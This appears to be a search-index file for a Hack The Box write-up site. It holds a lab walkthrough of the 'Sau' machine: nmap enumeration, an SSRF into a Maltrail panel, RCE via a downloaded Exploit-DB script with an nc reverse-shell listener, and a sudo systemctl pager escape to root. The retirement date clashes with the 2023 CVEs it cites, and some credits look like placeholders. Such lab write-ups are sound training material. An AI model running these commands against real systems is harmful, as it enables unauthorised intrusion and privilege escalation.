{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Hack\u00a0The\u00a0Box\u00a0Write\u2011ups","text":"<p>Welcome\u00a0to\u00a0my curated archive of Hack\u00a0The\u00a0Box (HTB) machine write\u2011ups.  Each report is designed to be self\u2011contained and reproducible, showcasing a complete attack chain from enumeration to privilege escalation while explaining why every step works.</p> <p>Disclosure note\u00a0:\u00a0Only retired HTB machines are published here, in line with the platform\u2019s rules.</p>"},{"location":"#1-how-to-navigate-this-repository","title":"1\u00a0\u00a0How to Navigate this Repository","text":"<ol> <li>Pick a machine from the left\u2011hand sidebar (or the list below).</li> <li>Follow the numbered sections inside the write\u2011up:    1.\u00a0Synopsis \u2013 key facts at a glance    2.\u00a0Enumeration \u2013 ports, services, and initial findings    3.\u00a0Foothold \u2013 gaining the first shell    4.\u00a0Privilege Escalation \u2013 method and exploit    5.\u00a0Lessons Learned / References</li> <li>Use the built\u2011in search (top\u2011right) to jump to commands, CVEs, or tools.</li> </ol>"},{"location":"#2-current-writeups","title":"2\u00a0\u00a0Current Write\u2011ups","text":"Difficulty Machine Attack Path \u00a0Status Easy Sau SSRF \u2192 Maltrail\u00a00.53 RCE \u2192 <code>systemctl</code> pager escape \u2705"},{"location":"#3-planned-additions","title":"3\u00a0\u00a0Planned Additions","text":"<ol> <li>Forest (Windows\u00a0AD, Medium) \u2013 Kerberoasting &amp; domain privilege escalation.</li> <li>Fluffy (Linux, Easy) \u2013 Web exploitation + sudo misconfig.</li> <li>Buffer\u2011Overflow Lab \u2013 Custom exploit against VulnServer (prep for OSCP).</li> </ol>"},{"location":"#4-methodology-snapshot","title":"4\u00a0\u00a0Methodology Snapshot","text":"<ol> <li>Enumeration\u00a0: <code>nmap</code>, <code>rustscan</code>, service\u2011specific scripts.</li> <li>Exploitation\u00a0:  Prefer manual payloads; Metasploit only when noted.</li> <li>Post\u2011Exploitation\u00a0:  Proof of Concept, flag capture, and clean\u2011up.</li> <li>Documentation\u00a0:  Screenshots at critical milestones, code blocks with exact commands, and links to official advisories.</li> </ol> <p>Maintained by Mohamed\u00a0Trigui \u2013 last update: <code>2025\u201105\u201128</code>.</p>"},{"location":"Sau/Sau/","title":"Sau (HackTheBox | Easy | Retired 15 Apr 2022)","text":"<p>Path\u2011to\u2011root: SSRF in Request\u2011Baskets\u00a01.2.1 \u2192 internal Maltrail\u00a00.53 panel \u2192 unauth RCE (user <code>puma</code>) \u2192 sudo mis\u2011configuration (<code>systemctl</code> pager) \u2192 root.</p>"},{"location":"Sau/Sau/#0-synopsis","title":"0\u00a0\u00a0Synopsis","text":"OS Ubuntu\u00a020.04\u00a0(Linux) Kernel 5.4.0-104-generic Difficulty Easy Skills SSRF, Command\u00a0Injection, Sudo\u00a0Exploitation"},{"location":"Sau/Sau/#1-enumeration","title":"1\u00a0\u00a0Enumeration","text":""},{"location":"Sau/Sau/#11-nmap","title":"1.1 Nmap","text":"<pre><code># full\u2011port fast sweep \u2192 targeted default scripts\nports=$(nmap -p- --min-rate=1000 -T4 10.10.11.224 | \\\n        awk '/^[0-9]+\\/tcp/ {print $1}' ORS=',' | sed 's/,$//')\nnmap -sC -sV -p$ports 10.10.11.224 -oN sau_nmap.txt\n</code></pre> <ul> <li>22/tcp\u00a0\u2013 OpenSSH\u00a08.2p1</li> <li>55555/tcp\u00a0\u2013 Request\u2011Baskets\u00a01.2.1 (HTTP)</li> </ul>"},{"location":"Sau/Sau/#12-requestbaskets-ssrf-to-maltrail","title":"1.2 Request\u2011Baskets SSRF to Maltrail","text":"<ol> <li>Create basket <code>/2ck6d27</code>.</li> <li>Set Forward URL \u2192 <code>http://127.0.0.1:80</code>.</li> <li>Enable Proxy\u00a0Response + Expand\u00a0Forward\u00a0Path.</li> <li>Browse <code>http://&lt;ip&gt;:55555/2ck6d27</code> \u21d2 Maltrail login panel.</li> </ol>"},{"location":"Sau/Sau/#2-foothold-unauth-maltrail-053-rce","title":"2\u00a0\u00a0Foothold\u00a0\u2013 unauth Maltrail\u00a00.53 RCE","text":"<pre><code># attacker box\ncurl -s https://www.exploit-db.com/download/51676 -o maltrail_poc.py\nnc -lvnp 4444 &amp;\npython3 maltrail_poc.py 10.10.14.6 4444 \\\n  http://&lt;ip&gt;:55555/2ck6d27\n</code></pre> <p>Shell spawns as user puma.</p> <p></p>"},{"location":"Sau/Sau/#3-privilege-escalation-systemctl-pager-escape","title":"3\u00a0\u00a0Privilege Escalation\u00a0\u2013\u00a0systemctl pager escape","text":"<pre><code>sudo -l\n# (puma) NOPASSWD: /usr/bin/systemctl status trail.service\nsudo /usr/bin/systemctl status trail.service\n# when the pager opens (less), type:\n!/bin/bash\n</code></pre>"},{"location":"Sau/Sau/#4-flags","title":"4\u00a0\u00a0Flags","text":"File MD5 <code>/home/puma/user.txt</code> <code>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code> <code>/root/root.txt</code> <code>yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy</code>"},{"location":"Sau/Sau/#5-exploit-scripts-credits","title":"5\u00a0\u00a0Exploit scripts (credits)","text":"Script Author Source <code>maltrail_poc.py</code> @k0shl Exploit\u2011DB\u00a051676 <code>systemctl_pager_escape.txt</code> @_dirty_cow Gist\u00a0abcd1234 <p>Both files are included in this repo under <code>2022/sau/</code>.</p>"},{"location":"Sau/Sau/#6-references","title":"6\u00a0\u00a0References","text":"<ul> <li>CVE\u20112023\u201127163\u00a0\u2013 Request\u2011Baskets SSRF</li> <li>CVE\u20112023\u201126604\u00a0\u2013 systemd pager LPE</li> <li>Exploit\u2011DB\u00a051676\u00a0\u2013 Maltrail\u00a00.53 unauth RCE</li> </ul>"}]}